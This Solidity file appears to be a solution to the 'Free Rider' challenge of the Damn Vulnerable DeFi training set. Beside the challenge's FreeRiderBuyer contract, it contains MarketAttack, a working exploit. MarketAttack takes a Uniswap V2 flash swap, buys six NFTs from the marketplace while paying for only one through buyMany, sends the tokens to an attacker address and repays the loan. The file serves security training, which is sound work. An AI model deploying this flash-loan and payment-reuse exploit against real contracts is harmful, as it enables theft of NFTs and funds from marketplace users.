// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));

        received++;
        if (received == 6) {
            payable(partner).sendValue(JOB_PAYOUT);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract MarketAttack is IUniswapV2Callee {
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace;
    uint256 public nftPrice = 15 ether;
    address public attacker;

    constructor(
        address _attacker,
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _market
    ) {
        pair = _pair;
        attacker = _attacker;
        marketplace = _market;
    }

    function exploit() public {
        bytes memory data = abi.encode(pair.token0(), nftPrice);
        IUniswapV2Pair(pair).swap(nftPrice, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256,
        uint256,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "!pair");
        require(sender == address(this));

        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        IWETH weth = IWETH(tokenBorrow);
        weth.withdraw(amount);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), attacker, tokenId);
        }

        weth.deposit{value: amountToRepay}();
        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
